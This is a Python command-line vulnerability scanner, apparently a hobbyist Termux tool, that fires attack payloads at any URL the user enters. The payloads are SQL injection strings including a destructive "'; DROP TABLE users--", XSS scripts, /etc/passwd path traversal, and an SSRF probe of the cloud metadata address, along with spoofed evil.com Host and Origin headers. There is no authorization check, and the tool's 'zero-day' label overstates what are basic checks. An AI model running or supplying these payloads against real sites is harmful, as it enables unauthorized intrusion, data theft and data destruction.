#!/usr/bin/env python3
import requests
import threading
import queue
import time
import os
import sys
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class ZeroDayScanner:
    def __init__(self):
        self.vulnerabilities = []
        
    def scan_clickjacking(self, url):
        """Detect Clickjacking vulnerabilities"""
        try:
            print(f"[+] Checking Clickjacking on {url}")
            headers = requests.head(url, timeout=10).headers
            if 'X-Frame-Options' not in headers:
                self.vulnerabilities.append({
                    'type': 'CLICKJACKING',
                    'url': url,
                    'severity': 'HIGH',
                    'description': 'Missing X-Frame-Options header - Possible clickjacking'
                })
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
        return False

    def scan_cors(self, url):
        """Detect CORS misconfigurations"""
        try:
            print(f"[+] Checking CORS on {url}")
            headers = {'Origin': 'https://evil-domain.com'}
            response = requests.get(url, headers=headers, timeout=10)
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == '*' and acac == 'true':
                self.vulnerabilities.append({
                    'type': 'CORS_MISCONFIG',
                    'url': url,
                    'severity': 'HIGH',
                    'description': 'CORS allows arbitrary origins with credentials'
                })
                return True
            elif acao == 'https://evil-domain.com':
                self.vulnerabilities.append({
                    'type': 'CORS_ORIGIN_REFELECTION',
                    'url': url,
                    'severity': 'MEDIUM', 
                    'description': 'CORS reflects arbitrary Origin header'
                })
                return True
        except:
            pass
        return False

    def scan_host_header_injection(self, url):
        """Detect Host header injection"""
        try:
            print(f"[+] Checking Host Header Injection on {url}")
            parsed = urlparse(url)
            headers = {'Host': 'evil.com'}
            response = requests.get(url, headers=headers, timeout=10)
            
            if 'evil.com' in response.text:
                self.vulnerabilities.append({
                    'type': 'HOST_HEADER_INJECTION',
                    'url': url,
                    'severity': 'MEDIUM',
                    'description': 'Host header value reflected in response'
                })
                return True
        except:
            pass
        return False

    def scan_ssrf(self, url):
        """Detect potential SSRF points"""
        try:
            print(f"[+] Checking SSRF potential on {url}")
            # Test common SSRF parameters
            params = ['url', 'redirect', 'target', 'load', 'file']
            for param in params:
                test_url = f"{url}?{param}=http://169.254.169.254/latest/meta-data/"
                response = requests.get(test_url, timeout=5)
                if 'instance-id' in response.text or 'amazonaws' in response.text:
                    self.vulnerabilities.append({
                        'type': 'SSRF',
                        'url': test_url,
                        'severity': 'CRITICAL',
                        'description': f'Potential SSRF via {param} parameter'
                    })
                    return True
        except:
            pass
        return False

class CVScanner:
    def __init__(self):
        self.vuln_found = []
        self.patterns = {
            'SQLI': ["sql syntax", "mysql_fetch", "ora-", "microsoft odbc", "you have an error in your sql"],
            'XSS': ["<script>alert", "onerror=", "onload=", "javascript:", "alert("],
            'LFI': ["etc/passwd", "root:", "bin/bash", "boot.ini", "windows/system32"],
            'RCE': ["bin/sh", "cmd.exe", "system32", "whoami", "ls -la", "dir"],
            'XXE': ["file:///", "SYSTEM", "ENTITY", "<!DOCTYPE"],
            'LOGIN_BYPASS': ["welcome", "dashboard", "logout", "admin panel"]
        }

    def scan_sql_injection(self, url, param):
        """Scan for SQL Injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' AND 1=1--",
            "' AND 1=2--"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
                
                for pattern in self.patterns['SQLI']:
                    if pattern in response.text.lower():
                        self.vuln_found.append({
                            'type': 'SQL_INJECTION',
                            'url': test_url,
                            'severity': 'CRITICAL',
                            'parameter': param,
                            'payload': payload
                        })
                        return True
            except:
                continue
        return False

    def scan_xss(self, url, param):
        """Scan for XSS vulnerabilities"""
        payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert(1)</script>", 
    "javascript:alert('XSS')",
    "onload=alert('XSS')",
    "{{7*7}}",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>"
]
        
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
                
                if payload in response.text:
                    self.vuln_found.append({
                        'type': 'XSS',
                        'url': test_url,
                        'severity': 'HIGH',
                        'parameter': param,
                        'payload': payload
                    })
                    return True
            except:
                continue
        return False

    def scan_lfi(self, url, param):
        """Scan for Local File Inclusion"""
        payloads = [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
                
                for pattern in self.patterns['LFI']:
                    if pattern in response.text.lower():
                        self.vuln_found.append({
                            'type': 'LFI',
                            'url': test_url,
                            'severity': 'HIGH',
                            'parameter': param,
                            'payload': payload
                        })
                        return True
            except:
                continue
        return False

    def intensive_scan(self, target):
        """Perform intensive vulnerability scanning"""
        print(f"\n[+] Starting intensive CV scan on {target}")
        
        # Common parameters to test
        params = ['id', 'page', 'file', 'load', 'url', 'redirect', 'view', 'template', 'cmd']
        
        print("[+] Testing parameters:", ', '.join(params))
        
        for param in params:
            print(f"    Testing parameter: {param}")
            
            # SQL Injection test
            if self.scan_sql_injection(target, param):
                print(f"    [!] SQL Injection found in {param}")
            
            # XSS test
            if self.scan_xss(target, param):
                print(f"    [!] XSS found in {param}")
            
            # LFI test
            if self.scan_lfi(target, param):
                print(f"    [!] LFI found in {param}")

def display_banner():
    """Display awesome banner"""
    os.system('clear')
    print("""
    \033[92m
    ███████╗██████╗  ██████╗ ███████╗    ██████╗ ██╗   ██╗
    ╚══███╔╝██╔══██╗██╔════╝ ██╔════╝    ██╔══██╗╚██╗ ██╔╝
      ███╔╝ ██████╔╝██║  ███╗█████╗      ██████╔╝ ╚████╔╝ 
     ███╔╝  ██╔══██╗██║   ██║██╔══╝      ██╔══██╗  ╚██╔╝  
    ███████╗██║  ██║╚██████╔╝███████╗    ██████╔╝   ██║   
    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝    ╚═════╝    ╚═╝   
                                                            
    ZERO-DAY & CV SCANNER TERMUX EDITION
    \033[0m
    """)

def zero_day_scan():
    """Menu 1: Zero-Day Scanning"""
    display_banner()
    print("\n[ ZERO-DAY VULNERABILITY SCANNER ]")
    print("="*50)
    
    target = input("Enter target URL (e.g., https://example.com): ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    scanner = ZeroDayScanner()
    
    print(f"\n[+] Scanning {target} for Zero-Day vulnerabilities...")
    print("[+] This may take a few moments...\n")
    
    # Run all zero-day scans
    results = []
    results.append(scanner.scan_clickjacking(target))
    results.append(scanner.scan_cors(target))
    results.append(scanner.scan_host_header_injection(target))
    results.append(scanner.scan_ssrf(target))
    
    # Display results
    print("\n" + "="*60)
    print("ZERO-DAY SCAN RESULTS")
    print("="*60)
    
    if scanner.vulnerabilities:
        for vuln in scanner.vulnerabilities:
            print(f"\n[\033[91m{vuln['severity']}\033[0m] {vuln['type']}")
            print(f"URL: {vuln['url']}")
            print(f"Description: {vuln['description']}")
    else:
        print("\n[\033[92mSAFE\033[0m] No Zero-Day vulnerabilities detected")
    
    input("\nPress Enter to continue...")

def cv_scan():
    """Menu 2: CV Scanner"""
    display_banner()
    print("\n[ CV VULNERABILITY SCANNER ]")
    print("="*50)
    
    target = input("Enter target URL (e.g., https://example.com/page.php): ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    scanner = CVScanner()
    scanner.intensive_scan(target)
    
    # Display results
    print("\n" + "="*60)
    print("CV SCAN RESULTS")
    print("="*60)
    
    if scanner.vuln_found:
        for vuln in scanner.vuln_found:
            print(f"\n[\033[91m{vuln['severity']}\033[0m] {vuln['type']}")
            print(f"Parameter: {vuln['parameter']}")
            print(f"Payload: {vuln['payload']}")
            print(f"URL: {vuln['url']}")
    else:
        print("\n[\033[92mSAFE\033[0m] No common vulnerabilities detected")
    
    input("\nPress Enter to continue...")

def main():
    while True:
        display_banner()
        print("\n\033[94mMAIN MENU:\033[0m")
        print("1. Zero-Day Vulnerability Scanner")
        print("2. CV Vulnerability Scanner") 
        print("3. Exit")
        
        choice = input("\nSelect option (1-3): ").strip()
        
        if choice == '1':
            zero_day_scan()
        elif choice == '2':
            cv_scan()
        elif choice == '3':
            print("\n[+] Thanks for using Zero-CV Scanner!")
            print("[+] Stay ethical and responsible!")
            sys.exit(0)
        else:
            print("\n[-] Invalid choice! Please select 1, 2, or 3")
            input("Press Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[+] Scanner stopped by user")
        sys.exit(0)
